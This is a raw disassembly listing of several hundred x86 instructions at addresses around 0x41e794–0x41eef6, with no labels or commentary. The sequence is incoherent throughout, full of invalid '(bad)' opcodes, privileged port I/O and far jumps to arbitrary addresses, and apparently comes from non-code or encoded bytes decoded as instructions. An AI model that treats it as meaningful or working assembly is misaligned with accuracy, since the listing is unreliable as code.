  41e794:	cmc    
  41e795:	rcl    BYTE PTR [ecx],0x32
  41e798:	fbld   TBYTE PTR [ecx+0x17]
  41e79b:	mov    esi,0xa03abe84
  41e7a0:	and    eax,0x265160c3
  41e7a5:	mov    ecx,0x1895cd30
  41e7aa:	or     BYTE PTR [ebx+0x75bff926],0x9b
  41e7b1:	push   ebp
  41e7b2:	lds    ebx,FWORD PTR [ebp+0x4f]
  41e7b5:	and    esi,ecx
  41e7b7:	mov    cl,0x70
  41e7b9:	fnstenv [edi+0x6de1e5fb]
  41e7bf:	jbe    0x41e7f6
  41e7c1:	mov    ebp,0xf4d159e6
  41e7c6:	jg     0x41e83f
  41e7c8:	leave  
  41e7c9:	nop
  41e7ca:	dec    edi
  41e7cb:	push   es
  41e7cc:	es (bad) 
  41e7ce:	xlat   BYTE PTR ds:[ebx]
  41e7cf:	stc    
  41e7d0:	outs   dx,BYTE PTR ds:[esi]
  41e7d1:	adc    BYTE PTR [ecx+0x2d],ch
  41e7d4:	xor    ch,bh
  41e7d6:	cld    
  41e7d7:	sub    BYTE PTR [eax+0xd],0xf6
  41e7db:	or     BYTE PTR [esi-0x4e],cl
  41e7de:	xchg   esp,eax
  41e7df:	icebp  
  41e7e0:	cwde   
  41e7e1:	mov    ebp,0x343e12af
  41e7e6:	shr    BYTE PTR [edx],0x71
  41e7e9:	jecxz  0x41e7d1
  41e7eb:	xor    eax,0x7395c30d
  41e7f0:	fcmove st,st(4)
  41e7f2:	je     0x41e86b
  41e7f4:	mov    dl,0x62
  41e7f6:	out    dx,eax
  41e7f7:	and    eax,0x8052fd6b
  41e7fc:	sub    DWORD PTR [edx],edi
  41e7fe:	jae    0x41e831
  41e800:	jbe    0x41e7cc
  41e802:	retf   0x1ee2
  41e805:	xor    edx,ebp
  41e807:	mov    dh,0x18
  41e809:	push   esi
  41e80a:	je     0x41e79d
  41e80c:	mov    edi,0xd00a6176
  41e811:	cmp    ebx,ecx
  41e813:	or     BYTE PTR [ecx],ch
  41e815:	jns    0x41e7ba
  41e817:	clc    
  41e818:	pop    esi
  41e819:	sbb    eax,0xc86ca41a
  41e81e:	aad    0xb6
  41e820:	jle    0x41e7d6
  41e822:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e823:	push   0x32
  41e825:	scas   eax,DWORD PTR es:[edi]
  41e826:	outs   dx,BYTE PTR ds:[esi]
  41e827:	push   ds
  41e828:	xchg   ecx,eax
  41e829:	push   ecx
  41e82a:	adc    eax,0x30d802d2
  41e82f:	push   0x572ff4db
  41e834:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e835:	in     al,0x7d
  41e837:	sahf   
  41e838:	loope  0x41e83f
  41e83a:	sub    cl,dl
  41e83c:	lods   eax,DWORD PTR ds:[esi]
  41e83d:	sbb    DWORD PTR [ecx-0x4176c6c1],ebx
  41e843:	dec    ecx
  41e844:	cs je  0x41e872
  41e847:	jmp    0x7375530b
  41e84c:	adc    cl,dh
  41e84e:	xchg   ebp,eax
  41e84f:	inc    edi
  41e850:	lahf   
  41e851:	jg     0x41e81a
  41e853:	mov    dl,0xca
  41e855:	test   al,0xc2
  41e857:	shr    DWORD PTR [eax+0x60],cl
  41e85a:	fs inc ecx
  41e85c:	pop    esi
  41e85d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e85e:	lahf   
  41e85f:	into   
  41e860:	xchg   BYTE PTR ds:0x41ef5ad7,ah
  41e866:	push   edi
  41e867:	ficom  WORD PTR ds:0x98add5a5
  41e86d:	fsubr  DWORD PTR [esi+ebx*2+0x4f384b66]
  41e874:	push   edx
  41e875:	mov    gs,esi
  41e877:	jne    0x41e81c
  41e879:	add    edi,ebp
  41e87b:	stos   BYTE PTR es:[edi],al
  41e87c:	dec    edx
  41e87d:	or     BYTE PTR [ebp-0x30],bh
  41e880:	repnz fisttp WORD PTR [esi+ecx*4]
  41e884:	inc    edi
  41e885:	dec    ecx
  41e886:	lahf   
  41e887:	push   0x11667e21
  41e88c:	mov    edi,0xd573e632
  41e891:	jo     0x41e870
  41e893:	add    BYTE PTR [edi-0x19cf9a69],dh
  41e899:	call   0x152c:0x723ad407
  41e8a0:	jge    0x41e8a7
  41e8a2:	jmp    0x41e8cc
  41e8a4:	test   eax,0x73e51f90
  41e8a9:	inc    ebp
  41e8aa:	dec    esp
  41e8ab:	xchg   DWORD PTR [eax],eax
  41e8ad:	cli    
  41e8ae:	cmp    dl,ah
  41e8b0:	inc    edi
  41e8b1:	push   ebx
  41e8b2:	sbb    bh,BYTE PTR [ebx-0x2e31fb70]
  41e8b8:	fcmovne st,st(7)
  41e8ba:	jle    0x41e892
  41e8bc:	xor    BYTE PTR [edi-0x47],dl
  41e8bf:	cdq    
  41e8c0:	mov    esp,?
  41e8c2:	mov    ebx,0xd853c5fc
  41e8c7:	leave  
  41e8c8:	jmp    0x6378:0x82f2130d
  41e8cf:	(bad)  
  41e8d1:	iret   
  41e8d2:	(bad)  
  41e8d4:	jne    0x41e93e
  41e8d6:	xlat   BYTE PTR ds:[ebx]
  41e8d7:	add    esp,DWORD PTR [eax-0x1f]
  41e8da:	add    bh,BYTE PTR [edi+eax*2-0x5f]
  41e8de:	sub    edi,DWORD PTR [edi+0x65c494e6]
  41e8e4:	sbb    eax,0x7653b657
  41e8e9:	imul   ecx,ebx,0xffffffa6
  41e8ec:	cmp    eax,0xf5aa129a
  41e8f1:	mov    ecx,0x31ea88d1
  41e8f6:	retf   0x2973
  41e8f9:	add    al,0x9b
  41e8fb:	mov    bh,0xe1
  41e8fd:	jg     0x41e8ed
  41e8ff:	inc    edi
  41e900:	xchg   ebx,eax
  41e901:	sub    bh,BYTE PTR [esi]
  41e903:	fs jecxz 0x41e887
  41e906:	mov    al,ds:0xa988c987
  41e90b:	pop    ebx
  41e90c:	mov    ebx,0x13c1c19d
  41e911:	js     0x41e8eb
  41e913:	sub    edi,DWORD PTR [ebp-0x3e9eb514]
  41e919:	add    eax,0xdf78a41c
  41e91e:	popf   
  41e91f:	pop    ebx
  41e920:	out    dx,al
  41e921:	fcom   DWORD PTR ds:[esi-0x17]
  41e925:	cld    
  41e926:	cdq    
  41e927:	call   0x9c78:0x61634489
  41e92e:	xacquire xchg DWORD PTR [ecx-0x9],eax
  41e932:	ret    0x6358
  41e935:	cmp    eax,0xfc090403
  41e93a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e93b:	add    eax,0x5c0d1c4b
  41e940:	mov    esp,0x513557d1
  41e945:	(bad)  fs:[esi]
  41e948:	jb     0x41e8cb
  41e94a:	sub    al,0xe5
  41e94c:	loopne 0x41e961
  41e94e:	push   edx
  41e94f:	push   ds
  41e950:	scas   eax,DWORD PTR es:[edi]
  41e951:	mov    ds:0x4f24e584,al
  41e956:	or     BYTE PTR [edi],bh
  41e958:	pop    es
  41e959:	push   ss
  41e95a:	xchg   esi,eax
  41e95b:	(bad)  
  41e95c:	mov    edx,0x232a7b2f
  41e961:	dec    ebx
  41e962:	cs cmc 
  41e964:	into   
  41e965:	and    BYTE PTR [edx],0x10
  41e968:	dec    ecx
  41e969:	int    0xa3
  41e96b:	mov    BYTE PTR [ecx-0x67a68f1b],al
  41e971:	out    dx,eax
  41e972:	test   BYTE PTR [ebp-0x2ae4bd89],bl
  41e978:	mov    cl,0xb1
  41e97a:	js     0x41e949
  41e97c:	push   esi
  41e97d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e97e:	retf   0x7e65
  41e981:	inc    esi
  41e982:	or     BYTE PTR [edi],dl
  41e984:	pop    eax
  41e985:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e986:	mov    ?,WORD PTR [ecx+0x3d]
  41e989:	cmp    esi,edx
  41e98b:	in     eax,dx
  41e98c:	push   0x67e1dc62
  41e991:	sub    DWORD PTR [ebp+0x3cb4b442],esp
  41e997:	xchg   edi,eax
  41e998:	dec    esi
  41e999:	xchg   dh,bl
  41e99b:	or     eax,0xe32df3f7
  41e9a0:	sti    
  41e9a1:	int    0xa6
  41e9a3:	xchg   esp,eax
  41e9a4:	repz sub edi,ebx
  41e9a7:	inc    edi
  41e9a8:	dec    ecx
  41e9a9:	lods   al,BYTE PTR ds:[esi]
  41e9aa:	mov    eax,ds:0x18112f5a
  41e9af:	and    ecx,DWORD PTR [eax-0x67]
  41e9b2:	xchg   esi,eax
  41e9b3:	add    eax,0x2d082d63
  41e9b8:	inc    edi
  41e9b9:	je     0x41e9ad
  41e9bb:	aaa    
  41e9bc:	test   DWORD PTR [eax+0x1f],ecx
  41e9bf:	sar    DWORD PTR [ebx+0x6dfff538],cl
  41e9c5:	ds lahf 
  41e9c7:	jp     0x41e951
  41e9c9:	fmul   st(4),st
  41e9cb:	push   ebx
  41e9cc:	aam    0x4d
  41e9ce:	or     BYTE PTR [esi+0xcd473df],bh
  41e9d4:	and    ecx,DWORD PTR [eax+ecx*1-0x7d098584]
  41e9db:	xchg   edx,eax
  41e9dc:	xchg   DWORD PTR [edx+0x74fd9d70],edi
  41e9e2:	jg     0x41e97e
  41e9e4:	nop
  41e9e5:	clc    
  41e9e6:	repz clc 
  41e9e8:	cmp    DWORD PTR [ebx],esp
  41e9ea:	js     0x41e984
  41e9ec:	mov    ds:0x6080adc4,eax
  41e9f1:	cmp    eax,0x76dcb11b
  41e9f6:	out    dx,eax
  41e9f7:	jle    0x41ea74
  41e9f9:	and    eax,0xf1d9af1f
  41e9fe:	shl    DWORD PTR [eax+edi*2+0x38f5b1a1],0x87
  41ea06:	or     BYTE PTR [ebx-0x57e9016a],0xd7
  41ea0d:	fld    QWORD PTR [ebp-0x7d]
  41ea10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea11:	scas   eax,DWORD PTR es:[edi]
  41ea12:	add    BYTE PTR [eax],al
  41ea14:	sbb    BYTE PTR [ebx-0x59feb38b],bl
  41ea1a:	fsubr  DWORD PTR [esi]
  41ea1c:	sar    DWORD PTR [ebx-0x19],0xa8
  41ea20:	stc    
  41ea21:	mov    edi,0xaca57d67
  41ea26:	xchg   ecx,eax
  41ea27:	loope  0x41ea62
  41ea29:	push   esi
  41ea2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea2b:	out    dx,al
  41ea2c:	cmp    al,0xb
  41ea2e:	sbb    al,0x9a
  41ea30:	(bad)  
  41ea31:	retf   0x1f2f
  41ea34:	xor    BYTE PTR [eax+0x79],bl
  41ea37:	push   ecx
  41ea38:	jnp    0x41e9c1
  41ea3a:	shl    BYTE PTR [eax+0x5b],1
  41ea3d:	adc    ecx,0xc1b0982a
  41ea43:	aas    
  41ea44:	add    eax,0x916a5b93
  41ea49:	repz adc al,BYTE PTR fs:[eax+0x2b]
  41ea4e:	dec    ebx
  41ea4f:	lds    edx,FWORD PTR [edi-0x27b9f456]
  41ea55:	pop    ds
  41ea56:	out    0x16,al
  41ea58:	test   al,0xc
  41ea5a:	mov    cl,0x5a
  41ea5c:	daa    
  41ea5d:	cmc    
  41ea5e:	das    
  41ea5f:	in     eax,dx
  41ea60:	aad    0x93
  41ea62:	jle    0x41eadb
  41ea64:	xor    eax,0x98e2fe98
  41ea69:	ror    ch,0xef
  41ea6c:	int    0xbb
  41ea6e:	test   al,0xb9
  41ea70:	stos   DWORD PTR es:[edi],eax
  41ea71:	aad    0xc3
  41ea73:	pop    esp
  41ea74:	sub    bh,dh
  41ea76:	or     bl,bl
  41ea78:	pop    eax
  41ea79:	push   esi
  41ea7a:	inc    edx
  41ea7b:	jbe    0x41ea3e
  41ea7d:	pop    es
  41ea7e:	push   edi
  41ea7f:	xchg   ebp,eax
  41ea80:	(bad)  
  41ea82:	lock dec eax
  41ea84:	gs jnp 0x41ea3a
  41ea87:	addr16 popa 
  41ea89:	fst    st(2)
  41ea8b:	sti    
  41ea8c:	mov    dl,0x56
  41ea8e:	push   esp
  41ea8f:	mov    ah,0xf6
  41ea91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea92:	stos   BYTE PTR es:[edi],al
  41ea93:	sub    al,BYTE PTR [ebp-0x52]
  41ea96:	xchg   ebx,eax
  41ea97:	stos   BYTE PTR es:[edi],al
  41ea98:	mov    BYTE PTR [eax+0x52],dh
  41ea9b:	(bad)  
  41ea9c:	repz sub bh,BYTE PTR [edx-0x4ca0d1a7]
  41eaa3:	mov    ch,0x5
  41eaa5:	popa   
  41eaa6:	mov    DWORD PTR [ebx-0x3c],edi
  41eaa9:	test   DWORD PTR [eax],ebx
  41eaab:	lods   al,BYTE PTR ds:[esi]
  41eaac:	xchg   si,ax
  41eaae:	add    DWORD PTR [ecx-0x298f82a],0x5e
  41eab5:	mov    ch,0x52
  41eab7:	in     al,0x78
  41eab9:	je     0x41eb32
  41eabb:	or     BYTE PTR [ebp+0x4a2a2701],cl
  41eac1:	fisub  DWORD PTR ds:0x57d973db
  41eac7:	sahf   
  41eac8:	scas   eax,DWORD PTR es:[edi]
  41eac9:	aam    0x3a
  41eacb:	xchg   ebx,eax
  41eacc:	call   0x48f2:0x2fedda28
  41ead3:	in     al,0x88
  41ead5:	les    esp,FWORD PTR [edi+ecx*2+0x4a23b399]
  41eadc:	jge    0x41eb4b
  41eade:	pop    edx
  41eadf:	sub    al,0xdf
  41eae1:	pushf  
  41eae2:	lahf   
  41eae3:	adc    DWORD PTR [edi-0x368ca898],0x83f7e42f
  41eaed:	arpl   WORD PTR gs:[edi+0x1a],sp
  41eaf1:	pop    esi
  41eaf2:	(bad)  
  41eaf3:	fcomp  QWORD PTR [esi-0x49]
  41eaf6:	push   ss
  41eaf7:	cmp    al,0x49
  41eaf9:	bound  edx,QWORD PTR [ecx-0x79ab9a7]
  41eaff:	mov    eax,ds:0xd6573758
  41eb04:	cmp    BYTE PTR [edi-0x21],ah
  41eb07:	clc    
  41eb08:	jmp    0x41eb06
  41eb0a:	scas   al,BYTE PTR es:[edi]
  41eb0b:	in     al,dx
  41eb0c:	sub    BYTE PTR [ebp+0x27f57276],0xf9
  41eb13:	out    0x81,eax
  41eb15:	xchg   esi,eax
  41eb16:	xchg   esi,eax
  41eb17:	xor    al,BYTE PTR [ebp+0x64238ab0]
  41eb1d:	sar    BYTE PTR [esi+0x7a],cl
  41eb20:	xor    al,BYTE PTR [ecx]
  41eb22:	xchg   ebx,eax
  41eb23:	test   DWORD PTR [ecx],0x45814703
  41eb29:	mov    esp,0xf3bbdc28
  41eb2e:	mov    ds:0xd6579b6e,al
  41eb33:	mov    esp,0x45baa15d
  41eb38:	sbb    DWORD PTR [esi+0x48],ebx
  41eb3b:	adc    eax,0xe226624f
  41eb40:	gs inc esp
  41eb42:	jp     0x41eb89
  41eb44:	push   0xe548de7
  41eb49:	xchg   esp,eax
  41eb4a:	sbb    al,0x7b
  41eb4c:	shr    esp,cl
  41eb4e:	int3   
  41eb4f:	(bad)  
  41eb50:	call   0xf6bd:0x963edccb
  41eb57:	jns    0x41eb01
  41eb59:	mov    al,ds:0xae093e7f
  41eb5e:	xchg   ebx,eax
  41eb5f:	or     BYTE PTR [eax+0x5f1be9ad],dl
  41eb65:	les    ebx,FWORD PTR [edi+0x22b2f6bc]
  41eb6b:	inc    ebp
  41eb6c:	dec    ecx
  41eb6d:	xor    DWORD PTR ds:0xab3a4a42,ebp
  41eb73:	xchg   ebx,eax
  41eb74:	dec    esp
  41eb75:	or     esi,DWORD PTR [edi+0x1b]
  41eb78:	popa   
  41eb79:	mov    bl,0xf1
  41eb7b:	and    dl,BYTE PTR [edi]
  41eb7d:	jae    0x41ebad
  41eb7f:	retf   0x880
  41eb82:	jge    0x41eb79
  41eb84:	mov    bh,0xa8
  41eb86:	sahf   
  41eb87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb88:	pop    esp
  41eb89:	dec    esp
  41eb8a:	jbe    0x41eba4
  41eb8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb8d:	popa   
  41eb8e:	mov    bl,0x6f
  41eb90:	add    eax,0xd20a9505
  41eb95:	popf   
  41eb96:	inc    edi
  41eb98:	dec    edx
  41eb99:	out    dx,eax
  41eb9a:	inc    ecx
  41eb9b:	pushf  
  41eb9c:	mov    cl,0x7a
  41eb9e:	lea    esp,[edi-0x6c]
  41eba1:	stc    
  41eba2:	fimul  WORD PTR fs:[ebp-0x6b]
  41eba6:	test   eax,0x111ab39d
  41ebab:	daa    
  41ebac:	and    DWORD PTR [ecx-0x588f9b32],ecx
  41ebb2:	arpl   bx,bp
  41ebb4:	in     al,0x51
  41ebb6:	iret   
  41ebb7:	and    eax,0x5da8dc00
  41ebbc:	icebp  
  41ebbd:	inc    eax
  41ebbe:	shl    DWORD PTR [edx-0x5b5cc251],1
  41ebc4:	or     ch,ah
  41ebc6:	jle    0x41eba3
  41ebc8:	or     BYTE PTR [eax+0x5ce5deb0],bl
  41ebce:	test   BYTE PTR [edx+esi*2],bh
  41ebd1:	repz imul edx,edi,0x3e5885fb
  41ebd8:	push   esp
  41ebd9:	pop    ebx
  41ebda:	stos   DWORD PTR es:[edi],eax
  41ebdb:	pop    ecx
  41ebdc:	jns    0x41eb9c
  41ebde:	mov    ?,WORD PTR [esi-0x46f61999]
  41ebe4:	and    BYTE PTR [edi],al
  41ebe6:	in     al,dx
  41ebe7:	hlt    
  41ebe8:	xchg   edi,eax
  41ebe9:	(bad)  
  41ebeb:	push   ecx
  41ebec:	shr    ch,0x2e
  41ebef:	dec    ebx
  41ebf0:	aam    0xe3
  41ebf2:	in     eax,0x69
  41ebf4:	pop    edi
  41ebf5:	dec    ecx
  41ebf6:	and    DWORD PTR ds:0x3c5227a3,edi
  41ebfc:	push   0x5f3b2967
  41ec01:	sbb    dl,BYTE PTR [ebp-0x17]
  41ec04:	loopne 0x41ebba
  41ec06:	sub    eax,0x167ffab
  41ec0b:	icebp  
  41ec0c:	rol    DWORD PTR [edx-0x56],1
  41ec0f:	aam    0x85
  41ec11:	cmp    eax,0x57772a7f
  41ec16:	xor    eax,0x78fe338b
  41ec1b:	ins    DWORD PTR es:[edi],dx
  41ec1c:	mov    BYTE PTR [ebx-0x16],cl
  41ec1f:	add    cl,BYTE PTR [eax+0x45]
  41ec22:	add    al,BYTE PTR [eax]
  41ec24:	push   cs
  41ec25:	fidiv  DWORD PTR [edi]
  41ec27:	cs std 
  41ec29:	sbb    eax,0x31c9b9a0
  41ec2e:	xchg   edx,eax
  41ec2f:	cli    
  41ec30:	push   0xffffffd9
  41ec32:	mov    esi,DWORD PTR [esi+eiz*4]
  41ec35:	setge  BYTE PTR [ebx-0x7c07eed0]
  41ec3c:	(bad)  
  41ec3d:	fdiv   st(2),st
  41ec3f:	xchg   esi,eax
  41ec40:	xor    ah,BYTE PTR [edi]
  41ec42:	pop    esi
  41ec43:	inc    edi
  41ec44:	sub    DWORD PTR [ebx-0x10],esi
  41ec47:	(bad)  [edi-0x2b]
  41ec4a:	mov    ebx,DWORD PTR [ecx]
  41ec4c:	mov    dl,0xf9
  41ec4e:	outs   dx,DWORD PTR ds:[esi]
  41ec4f:	sahf   
  41ec50:	enter  0x1542,0xd9
  41ec54:	push   ds
  41ec55:	pop    edi
  41ec56:	sub    al,0x1c
  41ec58:	std    
  41ec59:	mov    bh,0xe5
  41ec5b:	sbb    bh,BYTE PTR es:[edx+eiz*4]
  41ec5f:	jle    0x41ec8f
  41ec61:	sar    BYTE PTR [edx-0xb],0xf1
  41ec65:	in     eax,0xe0
  41ec67:	lods   al,BYTE PTR ds:[esi]
  41ec68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec69:	hlt    
  41ec6a:	inc    ebx
  41ec6b:	(bad)  
  41ec6c:	int3   
  41ec6d:	pushf  
  41ec6e:	jns    0x41ec5b
  41ec70:	retf   0x56ea
  41ec73:	cwde   
  41ec74:	stc    
  41ec75:	(bad)  
  41ec76:	mov    DWORD PTR [edx-0x2e],esp
  41ec79:	adc    DWORD PTR fs:[ebx],0xddc974a9
  41ec80:	rcl    BYTE PTR [ebp+0x63066cad],1
  41ec86:	pop    DWORD PTR [eax+0x21e4a083]
  41ec8c:	mov    edx,0x12539b5f
  41ec91:	fbstp  TBYTE PTR [edi-0x1650c80c]
  41ec97:	popf   
  41ec98:	push   0xf9ff1469
  41ec9d:	and    bl,BYTE PTR fs:[eax+0x2a30d3c2]
  41eca4:	dec    esi
  41eca5:	jo     0x41ec48
  41eca7:	mov    ds:0xb2a36d0f,al
  41ecac:	sub    ch,ch
  41ecae:	in     eax,0xa2
  41ecb0:	popf   
  41ecb1:	pop    ss
  41ecb2:	mov    BYTE PTR [edx+eax*4-0x10],ch
  41ecb6:	adc    ebx,esp
  41ecb8:	addr16 aaa 
  41ecba:	aad    0x92
  41ecbc:	gs push edx
  41ecbe:	add    BYTE PTR [esi-0x5c90b71],ch
  41ecc4:	mov    DWORD PTR [ecx+esi*2],ebx
  41ecc7:	out    dx,al
  41ecc8:	xchg   edx,eax
  41ecc9:	mov    ds:0xb29cd6d,eax
  41ecce:	dec    edi
  41eccf:	repz xor al,0xe
  41ecd2:	in     al,0xf3
  41ecd4:	imul   DWORD PTR [edi]
  41ecd6:	es xchg esp,eax
  41ecd8:	mov    ds,ecx
  41ecda:	push   ss
  41ecdb:	ds xchg ebp,eax
  41ecdd:	int    0xb2
  41ecdf:	push   edi
  41ece0:	adc    dh,BYTE PTR ss:[eax+0x1f75ed0d]
  41ece7:	adc    DWORD PTR [esi+0xb71d6ac],0x66
  41ecee:	mov    dl,BYTE PTR [eax+0xa67a17f]
  41ecf4:	mov    DWORD PTR [ecx-0x4116ad74],edx
  41ecfa:	(bad)  
  41ecfb:	cli    
  41ecfc:	cmp    BYTE PTR gs:[edx],0x9d
  41ed00:	addr16 call 0x44b86b0b
  41ed06:	xor    bh,BYTE PTR [ebp+0x4d355154]
  41ed0c:	xchg   edx,eax
  41ed0d:	cs mov cl,0x27
  41ed10:	adc    BYTE PTR [ebx+edx*4+0x4b],bh
  41ed14:	dec    ebp
  41ed15:	xchg   edi,eax
  41ed16:	aad    0xbb
  41ed18:	jae    0x41ecd5
  41ed1a:	fsubr  QWORD PTR [ecx+0x1a98028e]
  41ed20:	ror    BYTE PTR [ebp-0x5167c523],cl
  41ed26:	in     eax,0x76
  41ed28:	jmp    0x18eccfb8
  41ed2d:	dec    esi
  41ed2e:	lea    ebx,[ebp+0x26]
  41ed31:	fs push esp
  41ed33:	inc    edi
  41ed34:	addr16 inc eax
  41ed36:	sbb    eax,0xdad7068a
  41ed3b:	sub    BYTE PTR gs:[edi],bl
  41ed3e:	cmp    eax,DWORD PTR es:[ebp+0x27]
  41ed42:	cmc    
  41ed43:	jae    0x41ed04
  41ed45:	push   0x6b
  41ed47:	fist   WORD PTR [ecx+0x334001e6]
  41ed4d:	call   0xdd0b5244
  41ed52:	cdq    
  41ed53:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41ed55:	inc    esp
  41ed56:	jle    0x41ed24
  41ed58:	dec    edi
  41ed59:	fcomp  st(2)
  41ed5b:	jnp    0x41ed8c
  41ed5d:	xchg   DWORD PTR [edi-0x22a6ad1d],edx
  41ed63:	and    BYTE PTR [ebx],dh
  41ed65:	fild   QWORD PTR [esi+0x40]
  41ed68:	xor    ecx,DWORD PTR [eax-0x4c27824c]
  41ed6e:	retf   
  41ed6f:	std    
  41ed70:	fsub   DWORD PTR [eax-0xa8f367a]
  41ed76:	or     ch,BYTE PTR [ecx+ebx*8-0x2999a0e7]
  41ed7d:	cdq    
  41ed7e:	inc    ecx
  41ed7f:	in     al,0xeb
  41ed81:	jecxz  0x41edd1
  41ed83:	inc    ecx
  41ed84:	loope  0x41ed9b
  41ed86:	xchg   ebp,eax
  41ed87:	inc    eax
  41ed88:	shl    DWORD PTR [esi],1
  41ed8a:	sbb    eax,0x1ece4600
  41ed8f:	mov    ds:0x4c0c9325,eax
  41ed94:	ja     0x41ed79
  41ed96:	adc    DWORD PTR [edi-0x39],eax
  41ed99:	in     al,dx
  41ed9a:	sbb    DWORD PTR ds:0xf6a966ea,esi
  41eda0:	xchg   BYTE PTR [ecx],bh
  41eda2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eda3:	adc    esp,DWORD PTR [edx+esi*8+0x7c2fc2fd]
  41edaa:	push   esp
  41edab:	jecxz  0x41ed9d
  41edad:	xchg   DWORD PTR [edi-0x44b026d7],esi
  41edb3:	dec    esi
  41edb4:	(bad)  
  41edb6:	rcl    cl,0x26
  41edb9:	xchg   BYTE PTR [ecx],ch
  41edbb:	hlt    
  41edbc:	scas   al,BYTE PTR es:[edi]
  41edbd:	scas   al,BYTE PTR es:[edi]
  41edbe:	repz mov ecx,0x2d16c85f
  41edc4:	and    BYTE PTR [esi-0x72],ah
  41edc7:	popa   
  41edc8:	int3   
  41edc9:	mov    cl,0x2d
  41edcb:	ret    
  41edcc:	xlat   BYTE PTR ds:[ebx]
  41edcd:	adc    BYTE PTR [eax+0x775e69f5],0x25
  41edd4:	mov    edx,0xb7655391
  41edd9:	mov    cs,esi
  41eddb:	pop    ebp
  41eddc:	int    0x3f
  41edde:	repz inc esp
  41ede0:	arpl   cx,si
  41ede2:	sar    DWORD PTR [esi],0xa
  41ede5:	cmp    ch,dl
  41ede7:	sub    dl,BYTE PTR [ecx+0x172a3358]
  41eded:	dec    ebx
  41edee:	arpl   cx,di
  41edf0:	imul   esp,DWORD PTR [edx],0x530f0b5c
  41edf6:	call   0x544c:0x4bbcc122
  41edfd:	sub    esi,DWORD PTR [edi]
  41edff:	adc    eax,0x8ff9034a
  41ee04:	imul   edx,DWORD PTR [esi-0x1f],0x9f9ae2a1
  41ee0b:	push   edx
  41ee0c:	push   cs
  41ee0d:	nop
  41ee0e:	aam    0x62
  41ee10:	imul   ecx,esi,0x9d5c71e
  41ee16:	adc    eax,0x8d27e1c0
  41ee1b:	cmp    bh,BYTE PTR [ebp+0x0]
  41ee1e:	xor    edx,ecx
  41ee20:	mov    bh,0xb8
  41ee22:	mov    bp,0x8f70
  41ee26:	jg     0x41edca
  41ee28:	pop    edi
  41ee29:	cmp    al,0x91
  41ee2b:	fcomp  DWORD PTR [ecx-0x78]
  41ee2e:	mov    cl,BYTE PTR [edx+eax*8+0x73]
  41ee32:	cmp    al,0x2a
  41ee34:	int    0xd2
  41ee36:	mov    dh,0xc8
  41ee38:	push   edx
  41ee39:	imul   ebx,eax,0xc7cfa377
  41ee3f:	jnp    0x41ee6c
  41ee41:	mov    BYTE PTR [ecx+0x75263c04],dh
  41ee47:	push   eax
  41ee48:	adc    eax,0x1d9954e2
  41ee4d:	add    BYTE PTR [esi],0x86
  41ee50:	sub    bh,BYTE PTR [ebx]
  41ee52:	lods   al,BYTE PTR fs:[esi]
  41ee54:	dec    ecx
  41ee55:	mov    ebp,DWORD PTR [edx]
  41ee57:	cdq    
  41ee58:	lods   al,BYTE PTR ds:[esi]
  41ee59:	int3   
  41ee5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee5b:	inc    edi
  41ee5c:	xchg   esi,eax
  41ee5d:	or     DWORD PTR [edx],esp
  41ee5f:	cdq    
  41ee60:	ja     0x41eea1
  41ee62:	or     ecx,esp
  41ee64:	adc    eax,0xf9d7947d
  41ee69:	in     al,dx
  41ee6a:	aas    
  41ee6b:	pop    es
  41ee6c:	sbb    ecx,0xffffffd0
  41ee6f:	mov    dh,cl
  41ee71:	js     0x41eec6
  41ee73:	adc    ah,BYTE PTR [edi+ecx*4]
  41ee76:	xchg   WORD PTR [ecx],bp
  41ee79:	adc    DWORD PTR [ecx+0x70458e99],edi
  41ee7f:	cmp    bh,BYTE PTR [esi]
  41ee81:	fcom   st(3)
  41ee83:	push   es
  41ee84:	cmp    cl,BYTE PTR [edx+0x714f374f]
  41ee8a:	pop    eax
  41ee8b:	push   ecx
  41ee8c:	push   eax
  41ee8d:	iretw  
  41ee8f:	adc    cl,BYTE PTR [edi-0x3a]
  41ee92:	jo     0x41ee95
  41ee94:	mov    ds:0x593c669,eax
  41ee99:	inc    edx
  41ee9a:	mov    cl,0xa5
  41ee9c:	sub    eax,0xaad1f8a5
  41eea1:	leave  
  41eea2:	push   0x11
  41eea4:	pop    ebx
  41eea5:	xchg   esi,eax
  41eea6:	ja     0x41ee80
  41eea8:	ja     0x41ee49
  41eeaa:	dec    eax
  41eeab:	mov    ah,0x18
  41eead:	mov    ebx,0x1874a73e
  41eeb2:	cmp    DWORD PTR [eax+0x1694b78a],ebp
  41eeb8:	test   BYTE PTR [edi-0x54],ah
  41eebb:	adc    dh,ah
  41eebd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eebe:	jbe    0x41eef9
  41eec0:	adc    DWORD PTR [ecx],edx
  41eec2:	mov    ah,0xec
  41eec4:	push   edi
  41eec5:	push   edx
  41eec6:	loope  0x41eeca
  41eec8:	icebp  
  41eec9:	addr16 pop eax
  41eecb:	xor    al,0x6
  41eecd:	jg     0x41ee55
  41eecf:	xor    al,BYTE PTR [edi+ecx*8+0x5614743e]
  41eed6:	das    
  41eed7:	or     ebp,DWORD PTR [edi]
  41eed9:	xchg   ebp,eax
  41eeda:	(bad)  
  41eedb:	aam    0x23
  41eedd:	jae    0x41ef41
  41eedf:	jnp    0x41ef3a
  41eee1:	cmp    DWORD PTR [eax-0x39],ebx
  41eee4:	cmp    eax,ecx
  41eee6:	mov    edi,ebp
  41eee8:	popf   
  41eee9:	mov    ds:0xa8df36cc,al
  41eeee:	adc    esi,edx
  41eef0:	add    ch,BYTE PTR [ebp+0x14]
  41eef3:	out    dx,eax
  41eef4:	fld    QWORD PTR [edx]
  41eef6:	and    DWORD PTR [edx],esp
